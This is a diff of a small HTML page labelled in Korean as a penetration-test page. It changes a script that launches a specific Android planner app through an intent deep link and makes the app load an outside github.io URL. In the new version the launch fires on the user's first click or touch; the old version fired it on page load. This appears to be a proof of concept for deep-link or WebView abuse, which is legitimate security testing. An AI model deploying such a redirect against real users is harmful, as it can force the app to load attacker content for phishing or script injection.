@@ -8,15 +8,23 @@
             font-family: Arial, sans-serif;
             background-color: #f2f2f2;
             margin: 0;
-            padding: 20px; 
+            padding: 20px;
         }
-        h1 {
-            color: #333;
-        }
+        h1 { color: #333; }
     </style>
 </head>
 <body>
     <h1>모의해킹 테스트용 페이지2</h1>
-    <script> window.location='intent://?url=https://fpdh0104.github.io/testhub/test1.html#Intent;scheme=bmplanner;package=kr.co.bomapp.planner;end;'</script>
+
+    <script>
+        function openApp() {
+            var target = "https://fpdh0104.github.io/testhub/test1.html";
+            window.location = "intent://app?url=" + encodeURIComponent(target)
+                + "#Intent;scheme=bmplanner;package=kr.co.bomapp.planner;end";
+        }
+        // 화면 첫 터치/클릭에서 바로 실행
+        document.addEventListener('click', openApp, { once: true });
+        document.addEventListener('touchstart', openApp, { once: true });
+    </script>
 </body>
 </html>
